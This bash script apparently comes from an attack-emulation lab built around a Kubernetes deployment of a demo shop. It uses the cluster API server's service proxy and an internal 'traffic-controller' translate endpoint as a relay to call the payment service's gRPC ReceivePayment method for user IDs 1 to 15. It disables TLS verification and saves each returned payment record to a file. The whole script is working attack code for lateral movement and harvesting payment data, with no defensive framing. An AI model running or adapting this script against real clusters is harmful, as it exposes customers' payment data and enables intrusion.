#!/usr/bin/env bash
set -euo pipefail

if [ -f ${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/require-tools.sh ]; then
  # Prefer the shared helper when the script runs inside the attacker image.
  source ${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/require-tools.sh
else
  # Remote stdin execution may not have the helper file available.
  require_tools() {
    local missing=()
    local tool
    for tool in "$@"; do
      command -v "$tool" >/dev/null 2>&1 || missing+=("$tool")
    done
    if (( ${#missing[@]} > 0 )); then
      echo "Missing required tools: ${missing[*]}" >&2
      exit 1
    fi
  }
fi

# Endpoint e risorse
ENDPOINT="https://$CONTROL_PLANE_NODE:$CONTROL_PLANE_PORT/api/v1/namespaces/$NSCREDS/services/traffic-controller:8080/proxy/translate"
TARGET="payment.$NSPAYMT.svc.cluster.local:8080"
METHOD='oteldemo.PaymentService/ReceivePayment'
PROTO_FILE="$DATA_PATH/KC3/demo.proto"

# Installing dependencies and setup
require_tools curl jq
mkdir -p "$(dirname "$PROTO_FILE")"

# Converting proto in json
PROTO_JSON="$(jq -Rs . < "$PROTO_FILE")"

OUT_FILE="$DATA_PATH/KC3/result_payments"
echo "Starting requests (user_id 1..15) → saving in $OUT_FILE"

for uid in $(seq 1 15); do
  BODY="$(
    jq -n \
      --arg target "$TARGET" \
      --arg method "$METHOD" \
      --arg uid "$uid" \
      --argjson proto "$PROTO_JSON" '
      {
        target: $target,
        method: $method,
        payload: { user_id: $uid },
        plaintext: true,
        proto_files_map: { "demo.proto": $proto }
      }'
  )"

  RESP="$(curl -sk -X POST "$ENDPOINT" \
    -H "Content-Type: application/json" \
    -d "$BODY")"

  # Extracting only .payment (if present) and adding one line NDJSON
  if echo "$RESP" | jq -e '.stdout.payment' >/dev/null 2>&1; then
    echo "$RESP" | jq -c '.stdout.payment' >> "$OUT_FILE"
    echo "user_id=$uid saved"
  else
    # Log error
    ERR_MSG="$(echo "$RESP" | jq -r '.error // empty' 2>/dev/null || true)"
    echo "user_id=$uid: no field .payment found${ERR_MSG:+ (errore: $ERR_MSG)}" >&2
  fi
done

echo "Done. File generated: $OUT_FILE"
